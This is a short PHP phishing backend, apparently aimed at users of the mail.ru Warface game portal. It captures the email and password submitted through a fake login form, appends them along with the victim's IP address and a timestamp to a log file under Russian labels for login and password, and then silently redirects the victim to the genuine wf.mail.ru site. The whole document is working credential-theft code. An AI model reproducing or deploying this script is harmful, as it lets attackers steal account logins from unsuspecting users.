<?PHP
 $email = $_POST['email'];
 $password = $_POST['password'];

 $ip=$_SERVER['REMOTE_ADDR'];
 $time = date("H:i | d.m.Y");
 $ssilka = "./bigdick.php";
 If (isset($_POST['email'])){ 
 $fp = fopen($ssilka, "a"); 
 $mytext = "<div>Логин: $email | Пароль: $password | Ip: <a href = http://ipgeobase.ru/?address=$ip&search= target=_blank style = color:#3AE2CE>$ip </a> | $time |</div>\n";
 $test = fwrite($fp, $mytext);
 fclose($fp);
 echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://wf.mail.ru/v/'></head></html>";
 }
?>